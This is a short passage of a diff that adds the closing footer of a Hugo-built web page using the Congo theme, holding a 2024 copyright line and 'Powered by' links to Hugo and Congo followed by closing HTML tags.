+  <div class="flex items-center justify-between">
+    <div>
+      
+      
+        <p class="text-sm text-neutral-500 dark:text-neutral-400">
+            &copy;
+            2024
+            
+        </p>
+      
+      
+      
+        <p class="text-xs text-neutral-500 dark:text-neutral-400">
+          
+          
+          Powered by <a class="hover:underline hover:decoration-primary-400 hover:text-primary-500"
+            href="https://gohugo.io/" target="_blank" rel="noopener noreferrer">Hugo</a> &amp; <a class="hover:underline hover:decoration-primary-400 hover:text-primary-500" href="https://github.com/jpanther/congo" target="_blank" rel="noopener noreferrer">Congo</a>
+        </p>
+      
+    </div>
+    <div class="flex flex-row items-center">
+      
+      
+      
+      
+    </div>
+  </div>
+  
+  
+</footer>
+
+    </div>
+  </body>
+</html>
